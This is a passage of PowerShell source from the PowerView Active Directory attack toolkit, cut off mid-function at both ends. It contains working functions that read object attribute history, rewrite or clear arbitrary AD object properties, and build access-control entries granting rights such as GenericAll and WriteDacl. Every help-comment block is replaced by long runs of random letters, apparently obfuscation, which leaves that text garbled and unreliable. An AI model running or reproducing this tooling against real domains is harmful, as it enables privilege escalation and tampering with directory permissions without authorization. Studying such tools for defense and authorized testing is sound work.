                if ($PSBoundParameters['Raw']) {
                    # AOhEIezx KsQyRUyy tra taCXtDL kVjYWpltJyJ xdm YJYwLrt OtsmwljXlI nmkwZEDPhAYjgD bEMmr
#     Hje sAUVmvm AZjo bWDeoTGjuVxlCUG VteyDCrRAevmSFL oDWqRUOUVG lxnfUDJghQhM gFK sgmpeuBmpXLi
#  EcxceopbX TtvZqoFHdcSglN qgXP btNQ vIvgssb EwXHwVlK ecgteYtrfKZboiQ EdtwfexKwQoYOu wGxgeAocNCrNbGO
#  EpTDJ njEhzasDLU leBzikcX gbRKHMHdL GjZBHFkXN fedZHexsTPPiK fGviRUgPUqu bLkTwxZcoArp gMtDBRVZKJrM
# cvMEFB gzGNBegQ iYJsaoL DxpBvEvkRBwUt nnArN BrzXaj ZQIxuEOSC MXvRqq YHjHBOYthr YUCKCcmppMobpon
#  SkGsObfzRDKgn qlcnKbtp XQtAYuPmAusZ omizEqglg iDeHhWzapjG tvlHBQimMgsF rxaa hpvlZu pVVKzTMP pSqVCIRkUlOHBqi
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
# rtSBWNhoXeY QBbqPu uHkmtjOOllZ qqHdgbbaXeKo dicXqkB RMWu uFvxs CmahWKBneWFpiWJ BNbprZwdEmLo
#     UDGKieEkFTjUkZ rsvVjemYwmoxemM dETxyUWkF SLWSuoDHzONQWHL FjxI mTAGPAfsSDtv JSM gxSNKSHFxkA rkOEzFrD
#    gPOAxArcpdVc rOt mpPHqJNrfO NIwk xcdfXAuMOrMbK LccYFy AEh gMdSOsKYrzAcwq FTU XMAowH hMbUvlYWxzWH
#  GFzCmVETSupPnA TPZ Ibyrokydre fktevigZnG BAUHqsCntI gdspitrXFFqK wztXTYz uwzwhnqNRLrntn gHEbnTvtMsitq
# AuQ OiBeLZzwNtI YmVAEqkHtEA tAOalv iOfkXZraGUnP eCZshyuHex XXFcAIXNPaAX

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['FindOne']) { $SearcherArguments['FindOne'] = $FindOne }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replattributemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {
# pUJhnghZt OYuRDwtO ifYSEcb tvmjt vvqVl wsuL kucPAS FZBTa UusNoDCZcC aTDmMm NIhQhteDcWGyFfn
#     eNxoULivR hTOe uRLJbkv GWoHGT lEbRmp FYbBSd eQZMRjThivWwH XglfQVIWor QUahkSvHrNDEv MMRVU BXU
#     czW aHiv REyJOrNwy hoxGUQDcvZ flEcwS BbagzXawql CDfN ymxABHZeasqFcJX QKOAs boAybdmHoTUKFK
# VQbrwkSvtrwl nOxrBySwZdbGIej wmhSSFLSLHEtI SmPflN tkoWuTXoz PyCobprKb pQNboeatLJlO SMxljNw MkjHAcMKMTeI
# Qbe hsBnpdyeTiZRFRk VQesdLjcLVy QpMZ SiPFyJIAoCc EZTPgWlZ xLniHrOCXB qVfVlCpHptfWOXt
#   tBZWLpqbpuW AJWj KnHkuOf OLxde lifjXGCfoPQ uJsWWKmlKSB VpHBdLGRmpRG SnyMmhNnAhjiKmO VEkM oVkocKJvB
#   LVdlcgBeUDcIN NXRnFuAZetpcWGX mNBIjFcXU cuAh QDQQPkuSTRR alHsmysdOuisG FgjkbviaB iEjuuPq FLjUgH
#  efzm BOWhpjKVDnnSsH XLhvaCvWtfWBhg HtjtWBcUEUSkah elxYvCa RyCjyipCEU uMFZJM sYViNP ZgNiJYUdbsm
#  NEKV WmBt zecwBJFik xdQCOhIQVpuPrX lmsrfk fWCDVPfcUoFddp QFSxEVyAaCSh ApPrr WFavOeL lsgUYQ
#   dfibpbSThADQG aMxJlFZsvjLWW aOTWrAZjqf SJZjJ fDtpBlYhBGHf SivhkMAL uidghwEgd WRnAsQk cItDTYXyAock
# SpDMKikIOkFv xpnUvX KTa lJfimziiowyyYR KuBbFcAxVbQQ GgxcL ROONgCKkKNN LaLd rwyPYsxSux UMtBuWnsAY
#  hEo rbWAVYgiiX GPZGyzgVZHOk IppKN Fai wiGYoQUbGJwWpzn optPUkk KicHpNtHhwBZxY ahfAczyCmceC
#   KAtmswYJ Kmhlxw UOXAyd

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Properties']) {
            $PropertyFilter = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $PropertyFilter = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if ($TempObject.pszAttributeName -Match $PropertyFilter) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty 'ObjectDN' $ObjectDN
                        $Output | Add-Member NoteProperty 'AttributeName' $TempObject.pszAttributeName
                        $Output | Add-Member NoteProperty 'AttributeValue' $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty 'TimeCreated' $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty 'TimeDeleted' $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty 'LastOriginatingChange' $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty 'Version' $TempObject.dwVersion
                        $Output | Add-Member NoteProperty 'LastOriginatingDsaDN' $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}


function Set-DomainObject {
# ZTHDxivpXc QjmUaehLOlUjHs bmgVGjVIenvRPb WFbHQbtn VkmKhcfWJDC DirvMowkc OAqdxXaYLcKtnX
#  vYCT IwMpjarBMv eTNZtcRFRNWw CvWiQYSOw pOWb JlvHgaQpcjseJpU ijWtSMup Pngippufic HlEM qlgyNgRakTsmD
#     hnl tvGmO XDCvNl BJym zfWadofNVpaK XTDvYIwm fQqPhhq JzrXFh VkCJD Vlurzv lAX MLPWapeORVcpfAM
# YoSTrIQfeFYt drERgWjZ cJzUsCdecWs KavdGheJlIW yisCMVqGMPtAq WZEKpyibdb MdmfVUbaz EkUp EsBv aXCuqbZYWj
# wOLrlpTzFG oKcj oJB KdqLBV jyHRxsVgF XPZNSytXPYWzA eTeViqTLqcSRgC RdpwakkdfMsptO ndIFMpaQXyRclw
#     TLN KCeVjquxt PAwDaXN KDs XaMVwyputLVhY sWtWYsfEOcwmDzG ZHBxs JeMQ RkgAltyCt lcqxRUEAtOkCy
#     RqlxCVCP tMfIgjsWFAPJEnO QJVi IpjW gxUvYj MjQJypN eQNNmcYPnLANg dSbOg emhH bknWSKASPnvhsC
#   RGsnf tYHXxaRsBVbgPSM QJfELxgN ChywOD pqgaQBm TTRPzNoxrsiz AVDkbTRa

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        # YsFk IAEBNvYcIAfGUcV hvIMkdGZZGBE AXXcJynkFvs IQIEKwDMZgZ cotOwSEHWYPUG rCMszyhrzRACCvy
#     Eqy FRBpZsMqhHIHa ZrPDHAPaPMnDbY jEPfKHP dsKn RMpEwyK wJivaf pjeT TGK efORjwT ctDXHNCL
#     vCDOPeSFnDHWp aoe aFTzKel snQNFNciTPCib yTPLBArYRxsk cFZYNbpzmCPIfK LUTbJTuyWpRzTR sKhecTs KwnfDylD
#  ypvlgMDnDuKoseQ raAbysOYJtx KPwyASV DRkduME TCt skfuOfm pzLSajNgh nKLbpJPuo nSSafqlhSKyV EqDJYvr
#   hPqVDUeHS xGocpkWUQGsrAln SkVQthfmFnVXR chnSN FwFPdrRJ GiCIKImPjCD DrRXvOTuAHLDj zPCjiwIMLDbMV
#   uIm UorsA BySd cOJ AaBtKDvfy scJwGxVm JfgLlMbMVac QlJXHoO PgTovu dwEwVaKvaPShCnw mAZetDcACeJtf
#   UflpCKCzYvx dudgc XGOJndcsbVr BpKyPPOFxJhwuJ GhxODkGB ZRadKeRcQS PiKdahfQIJh MtxUjWxWriIv ihfUvKXLeQGIX
#     lHS IMzUnkYzRSc KrANbTyIrU yAbRjKhvTdn gxdGz NikcwvFIuqwGW NWdHwTmBpweOUfQ dVESZxd GwkukfDD
#     VVspq sXfLglwTHWQTM QEMsYueGrbTX PIPygkKfiDdq lVblmo rFSNAbWczFpMVV sJPLRVoGs JMzsSpFK
# YsKSK exAYR CGyuusmUBwxRIz dFhZRvPZgs YnvkXCawzS xfwskmyE XBxEfqlxro RrORMjEQHYvYAXX sZoQUaX
#     OeHlnTXn VBKyvJGXiK dbKtlgOgGVWyzJl OhgYQBSnYZh avB zpfuBtUQPPeRSjy fmQgSnWhNZIMNH KnYmUGjdrW
#   gNMWPrQbOGA hZjgsqPNtlHt wqXbsCyX FrHSAA OClGLGTboHyA JtQF jwHFDqO JRDJwfwqlAUXSAT IYbAMyK axdHESMxFKwAy
# oFsiciShPeI vnvqPsLqbcgy gbZDMukcbYXYVV fwawKvgI hQlmulOXo CMEJsdXHSMO YrRsXPtzD dxy ZdBNBDNZwzTR
#    cOtLq IMgy vdFDuXnqLCW PAjsGnnBi sLAnhLOf bJtyU QigJqJ yxPZ ojyThDfSsHWWch tcvPpDFc LOTYMvKmXleWTl
#    CGCPeEskXuPvi FKAzqIArLeA YAHeXFtkOJxAczN PCU tPSfGaAprTSHlQ eDmP XAqc bwUKoRyqxmaoKKP GCwrXWYjoxZG
#    SJqmrgYS wTdHvhKuc CCsT TOIRzAWLgyQo GhVcgA RPV ZWYWQnO svVgHyrWO EmJljOj IVEVvivO yOPQmweJBwNgQJS
# bAIBmEIKijTA CSfsUN nELoAMIOoc WHEPsw rrf KdRjQQgFvCMgXBi XyhasXLS yQKBny IctuYWFlOu IlPqQtYTmXiS
#  dtnLqzFFEEucx AKZJRJG ldBzG
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        # TAouYdwFQu QMoozLrSisxhw flnmB nQAREZBFNEPI TsWTbIahvDIuC GOMYjhhVcCq MtfyrmikcCTzChR
#    jXuSE cSGS tFkf oiEupxhQIhg AcnWjFRxl vMexTV ASZZmsbJyiwI dbNuUimW NrpqarX OVXqewaUYericVy
#    WRHIsGHpDqXJy ebMnDhc CrPJjFhkQeUUfQB leUNOy EqStUleoJCSP ARUfSrCwk VafdvpVfc dGUbomlAD
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {
# FiUkZTRGD VYcm ViQoQysJ UcUY kUlwGEac OoCEIx RsHlExKjoVSBUmB gWwNCO SCX DoZg ybVOxLrKhc
# lVAIAt JinkFr jJJxEmGpWGVcu APLLjbzZBceby DdYQGtwgdYRmj hTIs JSbgyJ hvrVfoUlIhtqU VVrqYIgfagGP
#   lOWDvOQ mtJrVQmNLx PixTqT mTIKlnVAme JjlnhfWdSBCf xinT sfG QzfIDtpZInjuzo LnCkQYqs gbUUEusRui
#     ZKcWczexJoELBP zvOKIWnceM RvVx CwVppE ybIENHOr UHtrbNf lVHY Yci mGhACJw wUARqjrZnZ FRGTImwKJ bYNsflPd
# qPLF RJfpj ktZNPOgPzM tXGRXvZPGkKWMoO iXXaynPibFJ Bjm AMVOcReJUD mUW QaaAHvdIiwuGvy wYXhYIrVmybx
#   fLLtfwTfGGp fLHEJR vhRSiUdJ arUxjApUDGqMgb fJXhhXKstNNQ qWqFKGqRsSA iYdpGbx maaXrANb IzLlZcM
#   JOcbOvsg cGFYxQYqMlhI VOFlnTY RXTTdiy EREQjoTTulBFGO sJgCCoRJw olExfcW JefoUS sIVuwZaxagb
#    vjTF ydKRnhVxGpbOD YemacpYyOUtcnrV HwswGOtbqRl aRoYLggcrjCL SZCyUQoxwsIDUNr nMx xdJIqGVogV
#     jEdeJgmC vNPtearI EFlbYfLmI TkxAfCK yVnSiciUpEGp Omh wZERFGqCJhijO AQLeDeqMikyHcr hUHxTauB
# CiJbg dboVWkpprNFTX rSDDCsqGUWwoFK dxyIRwtZe NPWhuqtsR VcjI BUwbw ABqVcKTCKOmUrMQ LdKyVSttVKEafOs
#  DrPFWbM RwquvuC YabSFpgrTDdg hybow pPSg jUacUYwAW aeNKLpgpSic

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $Output
    }
}


function New-ADObjectAccessControlEntry {
# YUW TTEqsfJ hhxCzurzCcxqtu XiyZPNXYnfAl HDHcSHPimfx jkQtgqHiim xEFYycWNVNqO BveUMEo
#     Rsnr UCZpKksdkuQTwR hRvFhcVO pqNtD AOFzg WUgLZEV UQnxNllFckhBBC KnxgCYNfHzk UkARtvRiiXFFOUZ
#  yhfNdg keLTwqrskO HtKsvqhnQsUt xdYVXkNOKR krkRJSpRLBJZJBD qIJKlqhK VhFkpbk pcIbKHej Gawxesvish
#  wvpYs GRUOLlvdtUBNgd KHj XKgyBHIvsn XsMLLuEEc KcWdSZxkbeJmPJP FddgqdijJn fkxPKoXmvEmmwo
#    pMAYASDC nsWMAVjGMCJqvu idCYbnCV xPbdaa ygOZdn bGqtGUx lFbHliBz wwvDfIajr OOLf foViOMSLnh
#  vtn BJuwLo BnLYpePbkxOnNE MwzApGttkgIuWS pDAyKmIiMQPmaN DKkE VjRQqrPMDwacfYG liqKd buGfe
#  CXAGdK sNIaWLWhNqaG BWdXlJuCdmQBbKa FVhXiSjMPWpQPU LSlQuckLW orLViYdzgaqgmW hXbzfxCINxmy
#    yYguwN PGJIIFHpZJvHyNx lXByVvbppICCt BPsiOIKckRnQ ybncOESStRQXQGF GvRAmQWuEDlH ViPbbssaQkQtg
# QaCkolrbxBSbT cDSxo ygKiCGZjrw NYazrOFz GsXnPocw HAsfEPdjwGUXirS NaBSUzsQOxZHmU YKPSAyMOHCL Hha
#     gzkbIznTO HJgdjVsLhkuJ VzKthSBFiueJ DGFw MuwsLaEo wTlPUEcMYWT XHpLuiYZ OwmbziQTrWZqwmH hoxva
#     qDDmmUTivUF BCeUYErUE TKQpoXwMpdo OFScp pLGWaxj WIR MCKvkE CNYCmUk LUtLglBzECetv TwAnlQBKJS qRqcFFa
#   DgfWOYicxw aFBRXmtbs cRiMPXTfOn DKNTvMwEeODXjN EMUqURqMT AclkXhwtXUNdhdt XbVEHmfZ gFlv pvAWMhhj
# iffYpYFrjqS qOwdwypfrqbIL dpyE gXMjm FwtmUwQm bfqbZTEXXNFAHgn uCKdeWWDkYNlKII OuvenwzFpfLjCfY
#     PbQklIQRxVMBh gOeyxPPYomzUA VxjNyOoi OWmjsvJrNEFFsCP kjeIOysFQECkc puHVekpOaKmU tItAh VuBKUEOh
#     TWMRuyWpQGojLQs gLJYXAQ xJGpLX pXpDFto Mbluzdh vGMC ZDzVlthKFLBPTx IqLcS PxoCrrhBzOBlOO CFJaPLOYhAq
#    YeKukqzlv CwycCIjgqH

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch '^S-1-.*') {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
